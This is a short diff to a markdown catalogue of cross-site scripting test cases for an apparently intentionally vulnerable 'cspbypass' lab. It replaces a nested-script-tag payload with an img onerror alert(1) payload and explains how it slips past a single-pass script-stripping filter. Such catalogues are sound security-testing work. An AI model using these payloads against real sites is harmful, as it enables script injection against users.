@@ -30,10 +30,10 @@ Reflections under various CSP configurations that fail to actually prevent execu
 
 ### cspbypass-level4
 
-`/cspbypass/level4/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E`
+`/cspbypass/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<scr<script>ipt>alert(1)</script>`
-- context: single-pass /<\/?script[^>]*>/i strip — nested tag survives
+- payload: `<img src=x onerror=alert(1)>`
+- context: single-pass /<\/?script[^>]*>/i strip also eats the closing tag, so use a non-script tag
 
 ### cspbypass-level5
 
